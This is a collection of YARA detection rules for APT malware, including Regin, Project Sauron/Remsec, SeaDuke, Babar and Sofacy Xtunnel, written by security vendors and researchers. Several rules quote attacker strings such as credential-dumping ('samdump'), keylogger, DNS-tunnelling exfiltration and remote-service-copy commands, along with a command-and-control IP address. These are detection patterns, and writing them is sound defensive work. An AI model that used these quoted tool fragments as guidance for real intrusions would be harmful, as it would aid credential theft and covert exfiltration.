  "Regin_Sample_1": "rule Regin_Sample_1 \n{\n\n    meta:\n        description = \"Auto-generated rule - file-3665415_sys\"\n        author = \"@MalwrSignatures\"\n        date = \"26.11.14\"\n        hash = \"773d7fab06807b5b1bc2d74fa80343e83593caf2\"\n\n    strings:\n        $s0 = \"Getting PortName/Identifier failed - %x\" fullword ascii\n        $s1 = \"SerialAddDevice - error creating new devobj [%#08lx]\" fullword ascii\n        $s2 = \"External Naming Failed - Status %x\" fullword ascii\n        $s3 = \"------- Same multiport - different interrupts\" fullword ascii\n        $s4 = \"%x occurred prior to the wait - starting the\" fullword ascii\n        $s5 = \"'user registry info - userPortIndex: %d\" fullword ascii\n        $s6 = \"Could not report legacy device - %x\" fullword ascii\n        $s7 = \"entering SerialGetPortInfo\" fullword ascii\n        $s8 = \"'user registry info - userPort: %x\" fullword ascii\n        $s9 = \"IoOpenDeviceRegistryKey failed - %x \" fullword ascii\n        $s10 = \"Kernel debugger is using port at address %X\" fullword ascii\n        $s12 = \"Release - freeing multi context\" fullword ascii\n        $s13 = \"Serial driver will not load port\" fullword ascii\n        $s14 = \"'user registry info - userAddressSpace: %d\" fullword ascii\n        $s15 = \"SerialAddDevice: Enumeration request, returning NO_MORE_ENTRIES\" fullword ascii\n        $s20 = \"'user registry info - userIndexed: %d\" fullword ascii\n\n    condition:\n        all of them and filesize < 110KB and filesize > 80KB\n}",
  "Regin_Sample_2": "rule Regin_Sample_2 \n{\n\n    meta:\n        description = \"Auto-generated rule - file hiddenmod_hookdisk_and_kdbg_8949d000.bin\"\n        author = \"@MalwrSignatures\"\n        date = \"26.11.14\"\n        hash = \"a7b285d4b896b66fce0ebfcd15db53b3a74a0400\"\n\n    strings:\n        $s0 = \"\\\\SYSTEMROOT\\\\system32\\\\lsass.exe\" fullword wide\n        $s1 = \"atapi.sys\" fullword wide\n        $s2 = \"disk.sys\" fullword wide\n        $s3 = \"IoGetRelatedDeviceObject\" fullword ascii\n        $s4 = \"HAL.dll\" fullword ascii\n        $s5 = \"\\\\Registry\\\\Machine\\\\System\\\\CurrentControlSet\\\\Services\" fullword ascii\n        $s6 = \"PsGetCurrentProcessId\" fullword ascii\n        $s7 = \"KeGetCurrentIrql\" fullword ascii\n        $s8 = \"\\\\REGISTRY\\\\Machine\\\\System\\\\CurrentControlSet\\\\Control\\\\Session Manager\" wide\n        $s9 = \"KeSetImportanceDpc\" fullword ascii\n        $s10 = \"KeQueryPerformanceCounter\" fullword ascii\n        $s14 = \"KeInitializeEvent\" fullword ascii\n        $s15 = \"KeDelayExecutionThread\" fullword ascii\n        $s16 = \"KeInitializeTimerEx\" fullword ascii\n        $s18 = \"PsLookupProcessByProcessId\" fullword ascii\n        $s19 = \"ExReleaseFastMutexUnsafe\" fullword ascii\n        $s20 = \"ExAcquireFastMutexUnsafe\" fullword ascii\n    \n    condition:\n        all of them and filesize < 40KB and filesize > 30KB\n}",
  "Regin_Sample_3": "rule Regin_Sample_3 \n{\n\n    meta:\n        description = \"Detects Regin Backdoor sample fe1419e9dde6d479bd7cda27edd39fafdab2668d498931931a2769b370727129\"\n        author = \"@Malwrsignatures\"\n        date = \"27.11.14\"\n        hash = \"fe1419e9dde6d479bd7cda27edd39fafdab2668d498931931a2769b370727129\"       \n   \n    strings:\n        $hd = { fe ba dc fe }\n        $s0 = \"Service Pack x\" fullword wide\n        $s1 = \"\\\\REGISTRY\\\\MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\" fullword wide\n        $s2 = \"\\\\REGISTRY\\\\Machine\\\\Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\HotFix\" fullword wide\n        $s3 = \"mntoskrnl.exe\" fullword wide\n        $s4 = \"\\\\REGISTRY\\\\Machine\\\\System\\\\CurrentControlSet\\\\Control\\\\Session Manager\\\\Memory Management\" fullword wide\n        $s5 = \"Memory location: 0x%p, size 0x%08x\" wide fullword\n        $s6 = \"Service Pack\" fullword wide\n        $s7 = \".sys\" fullword wide\n        $s8 = \".dll\" fullword wide      \n        $s10 = \"\\\\REGISTRY\\\\Machine\\\\Software\\\\Microsoft\\\\Updates\" fullword wide\n        $s11 = \"IoGetRelatedDeviceObject\" fullword ascii\n        $s12 = \"VMEM.sys\" fullword ascii\n        $s13 = \"RtlGetVersion\" fullword wide\n        $s14 = \"ntkrnlpa.exe\" fullword ascii\n   \n    condition:\n        ( $hd at 0 ) and all of ($s*) and filesize > 160KB and filesize < 200KB\n}",
  "Regin_Sample_Set_1": "rule Regin_Sample_Set_1 \n{\n\n    meta:\n        description = \"Auto-generated rule - file SHF-000052 and ndisips.sys\"\n        author = \"@MalwrSignatures\"\n        date = \"26.11.14\"\n        hash1 = \"8487a961c8244004c9276979bb4b0c14392fc3b8\"\n        hash2 = \"bcf3461d67b39a427c83f9e39b9833cfec977c61\"      \n\n    strings:\n        $s0 = \"HAL.dll\" fullword ascii\n        $s1 = \"IoGetDeviceObjectPointer\" fullword ascii\n        $s2 = \"MaximumPortsServiced\" fullword wide\n        $s3 = \"KeGetCurrentIrql\" fullword ascii\n        $s4 = \"ntkrnlpa.exe\" fullword ascii\n        $s5 = \"\\\\REGISTRY\\\\Machine\\\\System\\\\CurrentControlSet\\\\Control\\\\Session Manager\" wide\n        $s6 = \"ConnectMultiplePorts\" fullword wide\n        $s7 = \"\\\\SYSTEMROOT\" fullword wide\n        $s8 = \"IoWriteErrorLogEntry\" fullword ascii\n        $s9 = \"KeQueryPerformanceCounter\" fullword ascii\n        $s10 = \"KeServiceDescriptorTable\" fullword ascii\n        $s11 = \"KeRemoveEntryDeviceQueue\" fullword ascii\n        $s12 = \"SeSinglePrivilegeCheck\" fullword ascii\n        $s13 = \"KeInitializeEvent\" fullword ascii\n        $s14 = \"IoBuildDeviceIoControlRequest\" fullword ascii\n        $s15 = \"KeRemoveDeviceQueue\" fullword ascii\n        $s16 = \"IofCompleteRequest\" fullword ascii\n        $s17 = \"KeInitializeSpinLock\" fullword ascii\n        $s18 = \"MmIsNonPagedSystemAddressValid\" fullword ascii\n        $s19 = \"IoCreateDevice\" fullword ascii\n        $s20 = \"KefReleaseSpinLockFromDpcLevel\" fullword ascii\n   \n    condition:\n        all of them and filesize < 40KB and filesize > 30KB\n}",
  "Regin_Sample_Set_2": "rule Regin_Sample_Set_2 \n{\n\n    meta:\n        description = \"Detects Regin Backdoor sample 4139149552b0322f2c5c993abccc0f0d1b38db4476189a9f9901ac0d57a656be and e420d0cf7a7983f78f5a15e6cb460e93c7603683ae6c41b27bf7f2fa34b2d935\"\n        author = \"@MalwrSignatures\"\n        date = \"27.11.14\"\n        hash1 = \"4139149552b0322f2c5c993abccc0f0d1b38db4476189a9f9901ac0d57a656be\"\n        hash2 = \"e420d0cf7a7983f78f5a15e6cb460e93c7603683ae6c41b27bf7f2fa34b2d935\"\n\n    strings:\n        $hd = { fe ba dc fe }    \n        $s0 = \"d%ls%ls\" fullword wide\n        $s1 = \"\\\\\\\\?\\\\UNC\" fullword wide\n        $s2 = \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\" fullword wide\n        $s3 = \"\\\\\\\\?\\\\UNC\\\\\" fullword wide\n        $s4 = \"SYSTEM\\\\CurrentControlSet\\\\Control\\\\Class\\\\{4D36E972-E325-11CE-BFC1-08002BE10318}\" fullword wide\n        $s5 = \"System\\\\CurrentControlSet\\\\Services\\\\Tcpip\\\\Linkage\" wide fullword\n        $s6 = \"\\\\\\\\.\\\\Global\\\\%s\" fullword wide\n        $s7 = \"temp\" fullword wide\n        $s8 = \"\\\\\\\\.\\\\%s\" fullword wide\n        $s9 = \"Memory location: 0x%p, size 0x%08x\" fullword wide        \n        \n        $s10 = \"sscanf\" fullword ascii\n        $s11 = \"disp.dll\" fullword ascii\n        $s12 = \"%x:%x:%x:%x:%x:%x:%x:%x%c\" fullword ascii\n        $s13 = \"%d.%d.%d.%d%c\" fullword ascii\n        $s14 = \"imagehlp.dll\" fullword ascii\n        $s15 = \"%hd %d\" fullword ascii\n   \n    condition:\n        ( $hd at 0 ) and all of ($s*) and filesize < 450KB and filesize > 360KB\n}",
  "apt_regin_legspin": "rule apt_regin_legspin \n{\n\n    meta:\n        copyright = \"Kaspersky Lab\"\n        description = \"Rule to detect Regin's Legspin module\"\n        version = \"1.0\"\n        last_modified = \"2015-01-22\"\n        reference = \"https://securelist.com/blog/research/68438/an-analysis-of-regins-hopscotch-and-legspin/\"\n        md5 = \"29105f46e4d33f66fee346cfd099d1cc\"\n\n    strings:\n        $mz=\"MZ\"\n        $a1=\"sharepw\"\n        $a2=\"reglist\"\n        $a3=\"logdump\"\n        $a4=\"Name:\" wide\n        $a5=\"Phys Avail:\"\n        $a6=\"cmd.exe\" wide\n        $a7=\"ping.exe\" wide\n        $a8=\"millisecs\"\n   \n    condition:\n        ($mz at 0) and all of ($a*)\n}",
  "apt_regin_hopscotch": "rule apt_regin_hopscotch \n{\n\n    meta:\n        copyright = \"Kaspersky Lab\"\n        description = \"Rule to detect Regin's Hopscotch module\"\n        version = \"1.0\"\n        last_modified = \"2015-01-22\"\n        reference = \"https://securelist.com/blog/research/68438/an-analysis-of-regins-hopscotch-and-legspin/\"\n        md5 = \"6c34031d7a5fc2b091b623981a8ae61c\"\n\n    strings:\n        $mz=\"MZ\"\n        $a1=\"AuthenticateNetUseIpc\"\n        $a2=\"Failed to authenticate to\"\n        $a3=\"Failed to disconnect from\"\n        $a4=\"%S\\\\ipc$\" wide\n        $a5=\"Not deleting...\"\n        $a6=\"CopyServiceToRemoteMachine\"\n        $a7=\"DH Exchange failed\"\n        $a8=\"ConnectToNamedPipes\"\n  \n    condition:\n        ($mz at 0) and all of ($a*)\n}",
  "apt_regin_2011_32bit_stage1": "rule apt_regin_2011_32bit_stage1 \n{\n    \n    meta:\n        copyright = \"Kaspersky Lab\"\n        description = \"Rule to detect Regin 32 bit stage 1 loaders\"\n        version = \"1.0\"\n        last_modified = \"2014-11-18\"\n    \n    strings:\n        $key1={331015EA261D38A7}\n        $key2={9145A98BA37617DE}\n        $key3={EF745F23AA67243D}\n        $mz=\"MZ\"\n\n    condition:\n        ($mz at 0) and any of ($key*) and filesize < 300000\n}",
  "apt_regin_rc5key": "rule apt_regin_rc5key \n{\n    \n    meta:\n        copyright = \"Kaspersky Lab\"\n        description = \"Rule to detect Regin RC5 decryption keys\"\n        version = \"1.0\"\n        last_modified = \"2014-11-18\"\n    \n    strings:\n        $key1={73 23 1F 43 93 E1 9F 2F 99 0C 17 81 5C FF B4 01}\n        $key2={10 19 53 2A 11 ED A3 74 3F C3 72 3F 9D 94 3D 78}\n\n    condition:\n        any of ($key*)\n}",
  "apt_regin_vfs": "rule apt_regin_vfs \n{\n    \n    meta:\n        copyright = \"Kaspersky Lab\"\n        author = \"Kaspersky Lab\"\n        description = \"Rule to detect Regin VFSes\"\n        version = \"1.0\"\n        last_modified = \"2014-11-18\"\n    \n    strings:\n        $a1={00 02 00 08 00 08 03 F6 D7 F3 52}\n        $a2={00 10 F0 FF F0 FF 11 C7 7F E8 52}\n        $a3={00 04 00 10 00 10 03 C2 D3 1C 93}\n        $a4={00 04 00 10 C8 00 04 C8 93 06 D8}\n    \n    condition:\n    ($a1 at 0) or ($a2 at 0) or ($a3 at 0) or ($a4 at 0)\n}",
  "apt_regin_dispatcher_disp_dll": "rule apt_regin_dispatcher_disp_dll \n{\n\n    meta:\n        copyright = \"Kaspersky Lab\"\n        author = \"Kaspersky Lab\"\n        description = \"Rule to detect Regin disp.dll dispatcher\"\n        version = \"1.0\"\n        last_modified = \"2014-11-18\"\n\n    strings:\n        $mz=\"MZ\"\n        $string1=\"shit\"\n        $string2=\"disp.dll\"\n        $string3=\"255.255.255.255\"\n        $string4=\"StackWalk64\"\n        $string5=\"imagehlp.dll\"\n    \n    condition:\n        ($mz at 0) and (all of ($string*))\n}",
  "apt_regin_2013_64bit_stage1": "rule apt_regin_2013_64bit_stage1 \n{\n    \n    meta:\n        copyright = \"Kaspersky Lab\"\n        description = \"Rule to detect Regin 64 bit stage 1 loaders\"\n        version = \"1.0\"\n        last_modified = \"2014-11-18\"\n        filename=\"wshnetc.dll\"\n        md5=\"bddf5afbea2d0eed77f2ad4e9a4f044d\"\n        filename=\"wsharp.dll\"\n        md5=\"c053a0a3f1edcbbfc9b51bc640e808ce\"\n\n    strings:\n        $mz=\"MZ\"\n        $a1=\"PRIVHEAD\"\n        $a2=\"\\\\\\\\.\\\\PhysicalDrive%d\"\n        $a3=\"ZwDeviceIoControlFile\"\n\n    condition:\n        ($mz at 0) and (all of ($a*)) and filesize < 100000\n}",
  "remsec_executable_blob_32": "rule remsec_executable_blob_32\n    {\n        meta:\n            author = \"remsec\"\n strings:\n     $code = { 31 06 83 C6 04 D1 E8 73 05 35 01 00 00 D0 E2 F0 }  \n condition:\n         all of them\n }",
  "remsec_executable_blob_64": "rule remsec_executable_blob_64\n {\n     meta:\n         author = \"remsec\"\n     strings:\n         $code = { 31 06 48 83 C6 04 D1 E8 73 05 35 01 00 00 D0 E2 EF }\n condition:  \n   all of them  \n }",
  "remsec_executable_blob_parser": "rule remsec_executable_blob_parser\n {\n     meta:\n         author = \"remsec\"\n     strings:\n         $code ={ ( 0F 82 ?? ?? 00 00 | 72 ?? ) ( 81 | 41 81 ) ( 3? | 3C 24 | 7D 00 ) 02 AA 02 C1 ( 0F 85 ?? ?? 00 00 | 75 ?? ) ( 8B | 41 8B | 44 8B | 45 8B ) ( 4? | 5? | 6? | 7? | ?4 24 | ?C 24 ) 06 }\n     condition:\n         all of them\n }",
  "remsec_encrypted_api": "rule remsec_encrypted_api\n {\n     meta:\n         author = \"remsec\"\n     strings:\n         $open_process ={ 91 9A 8F B0 9C 90 8D AF 8C 8C 9A FF }  \n condition:  \n   all of them  \n }",
  "remsec_packer_u": "rule remsec_packer_u\n {\n     meta:\n         author = \"remsec\"\n     strings:\n     $code={ 69 ( C? | D? | E? | F? ) AB 00 00 00 ( 81 | 41 81 ) C? CD 2B 00 00 ( F7 | 41 F7 ) E? ( C1 | 41 C1 ) E? 0D ( 69 | 45 69 ) ( C? | D? | E? | F? ) 85 CF 00 00 ( 29 | 41 29 | 44 29 | 45 29 | 2B | 41 2B | 44 2B | 45 2B )} \n condition:  \n   all of them  \n }",
  "remsec_packer_B": "rule remsec_packer_B\n {\n meta:\n         author = \"remsec\"\n strings:\n         $code ={ 00 00 48 8D ( 45 ?? | 84 24 ?? ?? 00 00 ) ( 44 88 6? 24 ?? | C6 44 24 ?? 00 ) 48 89 44 24 ?? 48 8D ( 45 ?? | 84 24 ?? ?? 00 00 ) C7 44 24 ?? 0? 00 00 00 2B ?8 48 89 ?C 24 ?? 44 89 6? 24 ?? 83 C? 08 89 ?C 24 ?? ( FF | 41 FF ) D? ( 05 | 8D 88 ) 00 00 00 3A }\n condition:\n         all of them\n }",
  "APT_Project_Sauron_Scripts": "rule APT_Project_Sauron_Scripts \n{\n\n    meta:\n        description = \"Detects scripts (mostly LUA) from Project Sauron report by Kaspersky\"\n        author = \"Florian Roth\"\n        reference = \"https://goo.gl/eFoP4A\"\n        date = \"2016-08-08\"\n\n    strings:\n        $x1 = \"local t = w.exec2str(\\\"regedit \"\n        $x2 = \"local r = w.exec2str(\\\"cat\"\n        $x3 = \"ap*.txt link*.txt node*.tun VirtualEncryptedNetwork.licence\"\n        $x4 = \"move O FakeVirtualEncryptedNetwork.dll\"\n        $x5 = \"sinfo | basex b 32url | dext l 30\"\n        $x6 = \"w.exec2str(execStr)\"\n        $x7 = \"netnfo irc | basex b 32url\"\n        $x8 = \"w.exec(\\\"wfw status\\\")\"\n        $x9 = \"exec(\\\"samdump\\\")\"\n        $x10 = \"cat VirtualEncryptedNetwork.ini|grep\"\n        $x11 = \"if string.lower(k) == \\\"securityproviders\\\" then\"\n        $x12 = \"exec2str(\\\"plist b | grep netsvcs\\\")\"\n        $x13 = \".*account.*|.*acct.*|.*domain.*|.*login.*|.*member.*\"\n        $x14 = \"SAURON_KBLOG_KEY =\"\n\n    condition:\n        1 of them\n}",
  "APT_Project_Sauron_arping_module": "rule APT_Project_Sauron_arping_module \n{\n\n    meta:\n        description = \"Detects strings from arping module - Project Sauron report by Kaspersky\"\n        author = \"Florian Roth\"\n        reference = \"https://goo.gl/eFoP4A\"\n        date = \"2016-08-08\"\n\n    strings:\n        $s1 = \"Resolve hosts that answer\"\n        $s2 = \"Print only replying Ips\"\n        $s3 = \"Do not display MAC addresses\"\n\n    condition:\n        all of them\n}",
  "APT_Project_Sauron_kblogi_module": "rule APT_Project_Sauron_kblogi_module \n{\n\n    meta:\n        description = \"Detects strings from kblogi module - Project Sauron report by Kaspersky\"\n        author = \"Florian Roth\"\n        reference = \"https://goo.gl/eFoP4A\"\n        date = \"2016-08-08\"\n\n    strings:\n        $x1 = \"Inject using process name or pid. Default\"\n        $s2 = \"Convert mode: Read log from file and convert to text\"\n        $s3 = \"Maximum running time in seconds\"\n\n    condition:\n        $x1 or 2 of them\n}",
  "APT_Project_Sauron_basex_module": "rule APT_Project_Sauron_basex_module \n{\n\n    meta:\n        description = \"Detects strings from basex module - Project Sauron report by Kaspersky\"\n        author = \"Florian Roth\"\n        reference = \"https://goo.gl/eFoP4A\"\n        date = \"2016-08-08\"\n\n    strings:\n        $x1 = \"64, 64url, 32, 32url or 16.\"\n        $s2 = \"Force decoding when input is invalid/corrupt\"\n        $s3 = \"This cruft\"\n\n    condition:\n        $x1 or 2 of them\n}",
  "APT_Project_Sauron_dext_module": "rule APT_Project_Sauron_dext_module \n{\n\n    meta:\n        description = \"Detects strings from dext module - Project Sauron report by Kaspersky\"\n        author = \"Florian Roth\"\n        reference = \"https://goo.gl/eFoP4A\"\n        date = \"2016-08-08\"\n    \n    strings:\n        $x1 = \"Assemble rows of DNS names back to a single string of data\"\n        $x2 = \"removes checks of DNS names and lengths (during split)\"\n        $x3 = \"Randomize data lengths (length/2 to length)\"\n        $x4 = \"This cruft\"\n    \n    condition:\n        2 of them\n}",
  "Hacktool_This_Cruft": "rule Hacktool_This_Cruft \n{\n\n    meta:\n        description = \"Detects string 'This cruft' often used in hack tools like netcat or cryptcat and also mentioned in Project Sauron report\"\n        author = \"Florian Roth\"\n        reference = \"https://goo.gl/eFoP4A\"\n        date = \"2016-08-08\"\n        score = 60\n\n    strings:\n        $x1 = \"This cruft\" fullword\n\n    condition:\n        ( uint16(0) == 0x5a4d and filesize < 200KB and $x1 )\n}",
  "APT_Project_Sauron_Custom_M1": "rule APT_Project_Sauron_Custom_M1 \n{\n\n    meta:\n        description = \"Detects malware from Project Sauron APT\"\n        author = \"FLorian Roth\"\n        reference = \"https://goo.gl/eFoP4A\"\n        date = \"2016-08-09\"\n        hash1 = \"9572624b6026311a0e122835bcd7200eca396802000d0777dba118afaaf9f2a9\"\n\n    strings:\n        $s1 = \"ncnfloc.dll\" fullword wide\n        $s4 = \"Network Configuration Locator\" fullword wide\n\n        $op0 = { 80 75 6e 85 c0 79 6a 66 41 83 38 0a 75 63 0f b7 } /* Opcode */\n        $op1 = { 80 75 29 85 c9 79 25 b9 01 } /* Opcode */\n        $op2 = { 2b d8 48 89 7c 24 38 44 89 6c 24 40 83 c3 08 89 } /* Opcode */\n\n    condition:\n        ( uint16(0) == 0x5a4d and filesize < 200KB and ( all of ($s*) ) and 1 of ($op*) ) or ( all of them )\n}",
  "APT_Project_Sauron_Custom_M2": "rule APT_Project_Sauron_Custom_M2 \n{\n\n    meta:\n        description = \"Detects malware from Project Sauron APT\"\n        author = \"FLorian Roth\"\n        reference = \"https://goo.gl/eFoP4A\"\n        date = \"2016-08-09\"\n        hash1 = \"30a824155603c2e9d8bfd3adab8660e826d7e0681e28e46d102706a03e23e3a8\"\n\n    strings:\n        $s2 = \"\\\\*\\\\3vpn\" fullword ascii\n        $op0 = { 55 8b ec 83 ec 0c 53 56 33 f6 39 75 08 57 89 75 } /* Opcode */\n        $op1 = { 59 59 c3 8b 65 e8 ff 75 88 ff 15 50 20 40 00 ff } /* Opcode */\n        $op2 = { 8b 4f 06 85 c9 74 14 83 f9 12 0f 82 a7 } /* Opcode */\n    \n    condition:\n        ( uint16(0) == 0x5a4d and filesize < 400KB and ( all of ($s*) ) and all of ($op*) )\n}",
  "APT_Project_Sauron_Custom_M3": "rule APT_Project_Sauron_Custom_M3 \n{\n\n    meta:\n        description = \"Detects malware from Project Sauron APT\"\n        author = \"FLorian Roth\"\n        reference = \"https://goo.gl/eFoP4A\"\n        date = \"2016-08-09\"\n        hash1 = \"a4736de88e9208eb81b52f29bab9e7f328b90a86512bd0baadf4c519e948e5ec\"\n   \n    strings:\n        $s1 = \"ExampleProject.dll\" fullword ascii\n        $op0 = { 8b 4f 06 85 c9 74 14 83 f9 13 0f 82 ba } /* Opcode */\n        $op1 = { ff 15 34 20 00 10 85 c0 59 a3 60 30 00 10 75 04 } /* Opcode */\n        $op2 = { 55 8b ec ff 4d 0c 75 09 ff 75 08 ff 15 00 20 00 } /* Opcode */\n \n    condition:\n        ( uint16(0) == 0x5a4d and filesize < 1000KB and ( all of ($s*) ) and all of ($op*) )\n}",
  "APT_Project_Sauron_Custom_M4": "rule APT_Project_Sauron_Custom_M4 \n{\n\n    meta:\n        description = \"Detects malware from Project Sauron APT\"\n        author = \"FLorian Roth\"\n        reference = \"https://goo.gl/eFoP4A\"\n        date = \"2016-08-09\"\n        hash1 = \"e12e66a6127cfd2cbb42e6f0d57c9dd019b02768d6f1fb44d91f12d90a611a57\"\n\n    strings:\n        $s1 = \"xpsmngr.dll\" fullword wide\n        $s2 = \"XPS Manager\" fullword wide\n        $op0 = { 89 4d e8 89 4d ec 89 4d f0 ff d2 3d 08 00 00 c6 } /* Opcode */\n        $op1 = { 55 8b ec ff 4d 0c 75 09 ff 75 08 ff 15 04 20 5b } /* Opcode */\n        $op2 = { 8b 4f 06 85 c9 74 14 83 f9 13 0f 82 b6 } /* Opcode */\n\n    condition:\n        ( uint16(0) == 0x5a4d and filesize < 90KB and ( all of ($s*) ) and 1 of ($op*) ) or ( all of them )\n}",
  "APT_Project_Sauron_Custom_M6": "rule APT_Project_Sauron_Custom_M6 \n{\n\n    meta:\n        description = \"Detects malware from Project Sauron APT\"\n        author = \"FLorian Roth\"\n        reference = \"https://goo.gl/eFoP4A\"\n        date = \"2016-08-09\"\n        hash1 = \"3782b63d7f6f688a5ccb1b72be89a6a98bb722218c9f22402709af97a41973c8\"\n\n    strings:\n        $s1 = \"rseceng.dll\" fullword wide\n        $s2 = \"Remote Security Engine\" fullword wide\n        $op0 = { 8b 0d d5 1d 00 00 85 c9 0f 8e a2 } /* Opcode */\n        $op1 = { 80 75 6e 85 c0 79 6a 66 41 83 38 0a 75 63 0f b7 } /* Opcode */\n        $op2 = { 80 75 29 85 c9 79 25 b9 01 } /* Opcode */\n   \n    condition:\n        ( uint16(0) == 0x5a4d and filesize < 200KB and ( all of ($s*) ) and 1 of ($op*) ) or ( all of them )\n}",
  "APT_Project_Sauron_Custom_M7": "rule APT_Project_Sauron_Custom_M7 \n{\n\n    meta:\n        description = \"Detects malware from Project Sauron APT\"\n        author = \"FLorian Roth\"\n        reference = \"https://goo.gl/eFoP4A\"\n        date = \"2016-08-09\"\n        hash1 = \"6c8c93069831a1b60279d2b316fd36bffa0d4c407068dbef81b8e2fe8fd8e8cd\"\n        hash2 = \"7cc0bf547e78c8aaf408495ceef58fa706e6b5d44441fefdce09d9f06398c0ca\"\n\n    strings:\n        $sx1 = \"Default user\" fullword wide\n        $sx2 = \"Hincorrect header check\" fullword ascii /* Typo */\n        $sa1 = \"MSAOSSPC.dll\" fullword ascii\n        $sa2 = \"MSAOSSPC.DLL\" fullword wide\n        $sa3 = \"MSAOSSPC\" fullword wide\n        $sa4 = \"AOL Security Package\" fullword wide\n        $sa5 = \"AOL Security Package\" fullword wide\n        $sa6 = \"AOL Client for 32 bit platforms\" fullword wide\n        $op0 = { 8b ce 5b e9 4b ff ff ff 55 8b ec 51 53 8b 5d 08 } /* Opcode */\n        $op1 = { e8 0a fe ff ff 8b 4d 14 89 46 04 89 41 04 8b 45 } /* Opcode */\n        $op2 = { e9 29 ff ff ff 83 7d fc 00 0f 84 cf 0a 00 00 8b } /* Opcode */\n        $op3 = { 83 f8 0c 0f 85 3a 01 00 00 44 2b 41 6c 41 8b c9 } /* Opcode */\n        $op4 = { 44 39 57 0c 0f 84 d6 0c 00 00 44 89 6f 18 45 89 } /* Opcode */\n        $op5 = { c1 ed 02 83 c6 fe e9 68 fe ff ff 44 39 57 08 75 } /* Opcode */\n   \n    condition:\n        uint16(0) == 0x5a4d and filesize < 200KB and (( 3 of ($s*) and 3 of ($op*) ) or ( 1 of ($sx*) and 1 of ($sa*) ))\n}",
  "Scieron": "rule Scieron\n{\n    meta:\n        author = \"Symantec Security Response\"\n        ref = \"http://www.symantec.com/connect/tr/blogs/scarab-attackers-took-aim-select-russian-targets-2012\"\n        date = \"22.01.15\"\n\n    strings:\n        // .text:10002069 66 83 F8 2C                       cmp     ax, ','\n        // .text:1000206D 74 0C                             jz      short loc_1000207B\n        // .text:1000206F 66 83 F8 3B                       cmp     ax, ';'\n        // .text:10002073 74 06                             jz      short loc_1000207B\n        // .text:10002075 66 83 F8 7C                       cmp     ax, '|'\n        // .text:10002079 75 05                             jnz     short loc_10002080\n        $code1 = {66 83 F? 2C 74 0C 66 83 F? 3B 74 06 66 83 F? 7C 75 05}\n        \n        // .text:10001D83 83 F8 09                          cmp     eax, 9          ; switch 10 cases\n        // .text:10001D86 0F 87 DB 00 00 00                 ja      loc_10001E67    ; jumptable 10001D8C default case\n        // .text:10001D8C FF 24 85 55 1F 00+                jmp     ds:off_10001F55[eax*4] ; switch jump\n        $code2 = {83 F? 09 0F 87 ?? 0? 00 00 FF 24}\n        \n        $str1  = \"IP_PADDING_DATA\" wide ascii\n        $str2  = \"PORT_NUM\" wide ascii\n        \n    condition:\n        all of them\n}",
  "SeaDuke_Sample": "rule SeaDuke_Sample \n{\n\n    meta:\n        description = \"SeaDuke Malware - file 3eb86b7b067c296ef53e4857a74e09f12c2b84b666fc130d1f58aec18bc74b0d\"\n        author = \"Florian Roth\"\n        reference = \"http://goo.gl/MJ0c2M\"\n        date = \"2015-07-14\"\n        score = 70\n        hash = \"d2e570129a12a47231a1ecb8176fa88a1bf415c51dabd885c513d98b15f75d4e\"\n\n    strings:\n        $s0 = \"bpython27.dll\" fullword ascii\n        $s1 = \"email.header(\" fullword ascii /* PEStudio Blacklist: strings */\n        $s2 = \"LogonUI.exe\" fullword wide /* PEStudio Blacklist: strings */\n        $s3 = \"Crypto.Cipher.AES(\" fullword ascii /* PEStudio Blacklist: strings */\n        $s4 = \"mod is NULL - %s\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 4000KB and all of them\n}",
  "SNOWGLOBE_Babar_Malware": "rule SNOWGLOBE_Babar_Malware \n{\n\n    meta:\n        description = \"Detects the Babar Malware used in the SNOWGLOBE attacks - file babar.exe\"\n        author = \"Florian Roth\"\n        reference = \"http://motherboard.vice.com/read/meet-babar-a-new-malware-almost-certainly-created-by-france\"\n        date = \"2015/02/18\"\n        hash = \"27a0a98053f3eed82a51cdefbdfec7bb948e1f36\"\n        score = 80\n\n    strings:\n        $mz = { 4d 5a }\n        $z0 = \"admin\\\\Desktop\\\\Babar64\\\\Babar64\\\\obj\\\\DllWrapper\" ascii fullword\n        $z1 = \"User-Agent: Mozilla/4.0 (compatible; MSI 6.0;\" ascii fullword\n        $z2 = \"ExecQueryFailled!\" fullword ascii\n        $z3 = \"NBOT_COMMAND_LINE\" fullword\n        $z4 = \"!!!EXTRACT ERROR!!!File Does Not Exists-->[%s]\" fullword\n        $s1 = \"/s /n %s \\\"%s\\\"\" fullword ascii\n        $s2 = \"%%WINDIR%%\\\\%s\\\\%s\" fullword ascii\n        $s3 = \"/c start /wait \" fullword ascii\n        $s4 = \"(D;OICI;FA;;;AN)(A;OICI;FA;;;BG)(A;OICI;FA;;;SY)(A;OICI;FA;;;LS)\" ascii\n        $x1 = \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System\\\\\" fullword ascii\n        $x2 = \"%COMMON_APPDATA%\" fullword ascii\n        $x4 = \"CONOUT$\" fullword ascii\n        $x5 = \"cmd.exe\" fullword ascii\n        $x6 = \"DLLPATH\" fullword ascii\n    \n    condition:\n        ( $mz at 0 ) and filesize < 1MB and (( 1 of ($z*) and 1 of ($x*) ) or ( 3 of ($s*) and 4 of ($x*) ) )\n}",
  "apt_sofacy_xtunnel": "rule apt_sofacy_xtunnel\n{\n\n    meta:\n        author = \"Claudio Guarnieri\"\n        description = \"Sofacy Malware - German Bundestag\"\n        score = 75\n\n    strings:\n        $xaps = \":\\\\PROJECT\\\\XAPS_\"\n        $variant11 = \"XAPS_OBJECTIVE.dll\" $variant12 = \"start\"\n        $variant21 = \"User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:28.0) Gecko/20100101 Firefox/28.0\"\n        $variant22 = \"is you live?\"\n        $mix1 = \"176.31.112.10\"\n        $mix2 = \"error in select, errno %d\" $mix3 = \"no msg\"\n        $mix4 = \"is you live?\"\n        $mix5 = \"127.0.0.1\"\n        $mix6 = \"err %d\"\n        $mix7 = \"i`m wait\"\n        $mix8 = \"hello\"\n        $mix9 = \"OpenSSL 1.0.1e 11 Feb 2013\" $mix10 = \"Xtunnel.exe\"\n\n    condition:\n        ((uint16(0) == 0x5A4D) or (uint16(0) == 0xCFD0)) and (($xaps) or (all of ($variant1*)) or (all of ($variant2*)) or (6 of ($mix*))) \n}",
